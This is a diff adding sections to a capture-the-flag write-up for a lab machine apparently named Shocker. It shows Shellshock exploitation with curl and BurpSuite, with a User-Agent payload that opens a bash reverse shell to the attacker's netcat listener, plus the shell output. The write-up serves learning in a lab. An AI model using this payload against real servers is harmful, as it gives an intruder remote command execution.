@@ -386,7 +386,65 @@ If that variable gets passed into bash by the web server, the Shellshock problem
 The problem is that HTTP_USER_AGENT came from the User-Agent header which is something an attacker controls because it comes into the web server in an HTTP request. And that's a recipe for disaster because an attacker can make a vulnerable server run any command it wants."
 
 Knowing this now, we can run a `curl` command with the malicious string `() { :; };` and spawn a reverse shell from there.
+```
+hippoeug@kali:~$ curl --help all
+Usage: curl [options...] <url>
+     --abstract-unix-socket <path> Connect via abstract Unix domain socket
+     --alt-svc <file name> Enable alt-svc with this cache file
+     --anyauth       Pick any authentication method
+ -a, --append        Append to target file when uploading
+     --basic         Use HTTP Basic Authentication
+     --cacert <file> CA certificate to verify peer against
+     --capath <dir>  CA directory to verify peer against
+...
+ -H, --header <header/@file> Pass custom header(s) to server
+...
+ -T, --upload-file <file> Transfer local FILE to destination
+     --url <url>     URL to work with
+ -B, --use-ascii     Use ASCII/text transfer
+ -u, --user <user:password> Server user and password
+ -A, --user-agent <name> Send User-Agent <name> to server
+ -v, --verbose       Make the operation more talkative
+ -V, --version       Show version number and quit
+ -w, --write-out <format> Use output FORMAT after completion
+     --xattr         Store metadata in extended file attributes
+```
+We are interested in the `-H` flag, to change the `User-Agent` header.
 
 Let's run that malicious string in `User-Agent`.
 ```
+hippoeug@kali:~$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.x.x/4444 0>&1' http://10.129.139.89/cgi-bin/user.sh
+```
+We also need a reverse shell before running that command.
+```
+hippoeug@kali:~$ sudo nc -lnvp 4444
+[sudo] password for hippoeug: 
+listening on [any] 4444 ...
+connect to [10.10.x.x] from (UNKNOWN) [10.129.139.89] 43852
+bash: no job control in this shell
+shelly@Shocker:/usr/lib/cgi-bin$ id
+id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+shelly@Shocker:/usr/lib/cgi-bin$ 
+```
+We got a shell!
+
+## 7. Alternative Port 80 Shellshock Exploitation (BurpSuite)
+Same thing with Chapter 6, we simply want to modify the `User-Agent` header field.
+
+We launch BurpSuite, turn on Proxy for our browser, and browse to `http://10.129.139.89/cgi-bin/user.sh`.
+
+![burp1](https://user-images.githubusercontent.com/21957042/116809398-6db1fc80-ab70-11eb-8670-08e7ea86e2db.png)
+
+We see the original `User-Agent` field, and modify it to `() { :; }; /bin/bash -i >& /dev/tcp/10.10.x.x/4444 0>&1` before pressing the "Forward" button.
+
+![burp2](https://user-images.githubusercontent.com/21957042/116809399-6ee32980-ab70-11eb-812a-5d64247e39b4.png)
+
+And of course after running a reverse shell.
+```
+hippoeug@kali:~$ sudo nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.x.x] from (UNKNOWN) [10.129.139.89] 43856
+bash: no job control in this shell
+shelly@Shocker:/usr/lib/cgi-bin$ 
 ```
